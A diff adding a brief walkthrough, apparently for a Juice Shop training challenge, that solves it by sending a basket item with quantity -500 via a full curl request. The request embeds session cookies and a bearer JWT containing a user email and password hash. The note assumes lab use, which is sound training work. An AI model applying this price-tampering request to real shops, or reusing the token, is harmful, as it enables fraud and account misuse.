@@ -1,0 +1,10 @@
+Monitoring the network calls made during a item in cart, a call with the following data is interesting
+
+url : http://localhost:3000/api/BasketItems/
+json data : {"ProductId":23,"BasketId":"2","quantity":1}
+
+changing the quantity to a negative integer say -500 would solve the challenge
+
+curl "http://localhost:3000/api/BasketItems/" -H "Cookie: cookieconsent_status=dismiss; token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwiZW1haWwiOiJqaW1AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6ImU1NDFjYTdlY2Y3MmI4ZDEyODY0NzRmYzYxM2U1ZTQ1IiwiY3JlYXRlZEF0IjoiMjAxOC0wNS0xNyAxNDoyMzoyOS41NzkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAxOC0wNS0xNyAxNDoyMzoyOS41NzkgKzAwOjAwIn0sImlhdCI6MTUyNjU2OTUxOCwiZXhwIjoxNTI2NTg3NTE4fQ.GWQn3gZOzUiLECki-3ZYLXQWV2diEvnZzMFHDiRaWiwJszNx9CAcSbpfccnmZN3-hzX8qreMSKdMxt2EYw_CmUb7dFp9bWXK7tHly7VZnNBKnaEnvbU4IhOUgu77s74gRbN7iI_g-yUoQPvKHkmw2JzIpOKCIiWZTMVMpOOWG98; io=GJnhTP1nVzSTalvcAAAG; continueCode=1Wzw5L49mqdzoHWuNhktpc4IgTWf1SoHRuxhptac3Cmh9CoSmaGMbaOYr6gn" -H "Origin: http://localhost:3000" -H "Accept-Encoding: gzip, deflate, br" -H "Accept-Language: en-GB,en;q=0.9,en-US;q=0.8,kn;q=0.7" -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwiZW1haWwiOiJqaW1AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6ImU1NDFjYTdlY2Y3MmI4ZDEyODY0NzRmYzYxM2U1ZTQ1IiwiY3JlYXRlZEF0IjoiMjAxOC0wNS0xNyAxNDoyMzoyOS41NzkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAxOC0wNS0xNyAxNDoyMzoyOS41NzkgKzAwOjAwIn0sImlhdCI6MTUyNjU2OTUxOCwiZXhwIjoxNTI2NTg3NTE4fQ.GWQn3gZOzUiLECki-3ZYLXQWV2diEvnZzMFHDiRaWiwJszNx9CAcSbpfccnmZN3-hzX8qreMSKdMxt2EYw_CmUb7dFp9bWXK7tHly7VZnNBKnaEnvbU4IhOUgu77s74gRbN7iI_g-yUoQPvKHkmw2JzIpOKCIiWZTMVMpOOWG98" -H "Content-Type: application/json;charset=UTF-8" -H "Accept: application/json, text/plain, */*" -H "Referer: http://localhost:3000/" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" -H "Proxy-Connection: keep-alive" --data-binary "^{^\^"ProductId^\^":23,^\^"BasketId^\^":^\^"2^\^",^\^"quantity^\^":-500^}" --compressed
+
+
